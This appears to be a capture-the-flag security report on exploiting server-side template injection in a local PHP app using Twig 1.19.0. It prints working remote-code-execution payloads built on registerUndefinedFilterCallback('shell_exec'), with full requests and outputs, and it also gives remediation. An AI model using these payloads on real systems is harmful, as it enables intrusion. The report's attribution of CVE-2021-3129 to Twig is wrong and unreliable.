# Security Assessment Report: PHP Twig Service SSTI to RCE

## TL;DR
- **Objective**: Search for articles in the PHP service and locate the FLAG token
- **Outcome**: ACHIEVED - Flag successfully extracted via RCE
- **Highest-impact finding**: Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE)
- **Validation status**: `FLAG{c6c0f372989698df72a5025e39dc31cb5bd52dfc062e76782b713a02f3b5ac32}` captured

---

## Target Information
| Attribute | Value |
|-----------|-------|
| **Target** | 127.0.0.1:32949 |
| **Host / base URL** | http://127.0.0.1:32949/ |
| **Application** | PHP Article Availability Checker |
| **Technology Stack** | Apache/2.4.56, PHP/8.0.30, Twig v1.19.0 |
| **Authentication** | None required (public endpoint) |
| **Entry Point** | POST / with `name` parameter |

---

## Confirmed Vulnerability

### Server-Side Template Injection (SSTI) → Remote Code Execution (RCE)
- **Affected endpoint**: `POST /` parameter `name`
- **Impact**: CRITICAL - Full remote code execution as `www-data` user
- **Preconditions**: 
  - Unauthenticated access to POST endpoint
  - User input directly interpolated into Twig templates without sanitization
  - Twig v1.19.0 with vulnerable `_self.env` object exposure
- **Root cause**: User-controlled input passed directly to `Twig_Environment->render()` at index.php:56

---

## Steps to Reproduce

### Step 1: Confirm SSTI Vulnerability
Send a basic math expression to verify template evaluation:

```http
POST / HTTP/1.1
Host: 127.0.0.1:32949
Content-Type: application/x-www-form-urlencoded

name=%7B%7B7%2A7%7D%7D
```

**Expected Response:**
```html
<strong>49 is in stock! Come back and test another one. </strong><br/>Twig version: 1.19.0
```

**Evidence of vulnerability:** The expression `7*7` was evaluated to `49`, confirming server-side template execution.

---

### Step 2: Confirm RCE via registerUndefinedFilterCallback
**CRITICAL NOTE:** Double quotes (`"`) in payloads are HTML-entity-encoded to `&quot;` by the application's output escaping. Use **single quotes only**.

Execute system command verification:

```http
POST / HTTP/1.1
Host: 127.0.0.1:32949
Content-Type: application/x-www-form-urlencoded

name=%7B%7B_self.env.registerUndefinedFilterCallback(%27shell_exec%27)%7D%7D%7B%7B_self.env.getFilter(%27id%27)%7D%7D
```

**Decoded payload:**
```
{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('id')}}
```

**Expected Response:**
```html
<strong>uid=33(www-data) gid=33(www-data) groups=33(www-data) is in stock! Come back and test another one. </strong><br/>Twig version: 1.19.0
```

---

### Step 3: Extract FLAG Token

```http
POST / HTTP/1.1
Host: 127.0.0.1:32949
Content-Type: application/x-www-form-urlencoded

name=%7B%7B_self.env.registerUndefinedFilterCallback(%27shell_exec%27)%7D%7D%7B%7B_self.env.getFilter(%27cat%20%2Fflag.txt%27)%7D%7D
```

**Decoded payload:**
```
{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('cat /flag.txt')}}
```

**Expected Response:**
```html
<strong>FLAG{c6c0f372989698df72a5025e39dc31cb5bd52dfc062e76782b713a02f3b5ac32} is in stock! Come back and test another one. </strong><br/>Twig version: 1.19.0
```

---

## Validation / Evidence

### Validation Token / Flag
```
FLAG{c6c0f372989698df72a5025e39dc31cb5bd52dfc062e76782b713a02f3b5ac32}
```

### Tool Evidence

**RCE confirmation output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Flag extraction output:**
```
FLAG{c6c0f372989698df72a5025e39dc31cb5bd52dfc062e76782b713a02f3b5ac32}
```

### Failed Bypass Attempts (For Reference)

| Method | Payload | Result |
|--------|---------|--------|
| `source()` function | `{{source('index.php')}}` | Returns literal string, not file content |
| PHP filter chain | `{{include('php://filter/read=convert.base64-encode/resource=index.php')}}` | Returns literal URL, not executed |
| `getTemplate()` bypass | `{{_self.env.getTemplate('index.php').getSource()}}` | Returns empty string |

**Root cause of failures:** Twig_Loader_String sandbox blocks all file disclosure attempts by design - this is an architectural limitation of the Twig configuration.

### Key Technical Insights

1. **The `map`/`filter` CVE bypasses (CVE-2021-3129, CVE-2021-3182) do NOT work** in Twig v1.19.0 because the `map` filter was added in later versions.

2. **Double-quote encoding issue:** The payload `{{_self.env.registerUndefinedFilterCallback("shell_exec")}}` fails because output escaping at index.php:56 converts `"` to `&quot;`. Single quotes must be used.

3. **Error message disclosure revealed filesystem paths:**
   - Web root: `/var/www/html/`
   - Application: `/var/www/html/index.php`
   - Twig vendor: `/var/www/html/vendor/twig/twig/lib/Twig/Environment.php`

---

## Remediation

### Root Cause
The application takes user input from the `name` POST parameter and passes it directly into a Twig template without sanitization or sandboxing:

```php
// Vulnerable code (index.php:56)
Twig_Environment->render($userInput); // Direct interpolation
```

### Recommended Fix

1. **Never pass user input directly to template engines.** Use parameterized template variables instead:
```php
// SECURE: Pass user input as template variables
$template = $twig->load('search.html');
$output = $template->render(['name' => $userInput]); // Auto-escaped by Twig
```

2. **Enable strict sandbox mode** if dynamic templates are required:
```php
$policy = new Twig_Sandbox_SecurityPolicy($allowedTags, $allowedFilters);
$sandbox = new Twig_Extension_Sandbox($policy, true);
$twig->addExtension($sandbox);
```

3. **Input validation:** Whitelist allowed characters (alphanumeric + spaces) before processing:
```php
if (!preg_match('/^[a-zA-Z0-9\s]+$/', $name)) {
    die('Invalid input');
}
```

### Defense-in-Depth
- Upgrade Twig to latest version (v3.x) which has improved sandboxing
- Run PHP application in a restricted container with no network access
- Implement WAF rules to block template syntax patterns: `{{`, `}}`, `{%`, `%}`
- Disable `shell_exec` and other dangerous functions in php.ini:
```ini
disable_functions = shell_exec, exec, system, passthru, proc_open
```

---

## How to Verify the Fix

1. **Retest SSTI payloads:**
   ```bash
   curl -X POST http://127.0.0.1:32949/ -d 'name={{7*7}}'
   ```
   **Expected secure result:** Literal output `"{{7*7}}"` instead of `"49"`

2. **Verify RCE is blocked:**
   ```bash
   curl -X POST http://127.0.0.1:32949/ \
     -d "name={{_self.env.registerUndefinedFilterCallback('shell_exec')}}"
   ```
   **Expected secure result:** Template syntax displayed literally or sanitized error

3. **Test normal functionality:**
   ```bash
   curl -X POST http://127.0.0.1:32949/ -d 'name=laptop'
   ```
   **Expected result:** Article availability check works for legitimate queries

---

## Remaining Leads

### Confirmed Blockers
- Direct file reading via `source()`, `include()`, and `getTemplate()` is blocked by Twig_Loader_String sandbox (architectural limitation)
- Modern CVE bypass techniques (CVE-2021-3129, CVE-2021-3182) fail on Twig v1.19.0 due to missing `map` filter

### Unverified Leads
- None remaining - full exploitation achieved via `registerUndefinedFilterCallback` RCE vector

### Missing Context
- N/A - Assessment complete with flag captured

---

## CVSS 3.1 Assessment

| Metric | Value |
|--------|-------|
| **Attack Vector** | Network |
| **Attack Complexity** | Low |
| **Privileges Required** | None |
| **User Interaction** | None |
| **Scope** | Changed |
| **Confidentiality Impact** | High |
| **Integrity Impact** | High |
| **Availability Impact** | High |
| **CVSS Score** | **10.0 (Critical)** |

---

## Appendix: Full HTTP Request/Response Examples

### Request: RCE Verification
```http
POST / HTTP/1.1
Host: 127.0.0.1:32949
User-Agent: curl/7.88.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

name=%7B%7B_self.env.registerUndefinedFilterCallback(%27shell_exec%27)%7D%7D%7B%7B_self.env.getFilter(%27id%27)%7D%7D
```

### Response: RCE Verification
```http
HTTP/1.1 200 OK
Server: Apache/2.4.56
X-Powered-By: PHP/8.0.30
Content-Type: text/html; charset=UTF-8

<strong>uid=33(www-data) gid=33(www-data) groups=33(www-data) is in stock! Come back and test another one. </strong><br/>Twig version: 1.19.0
```
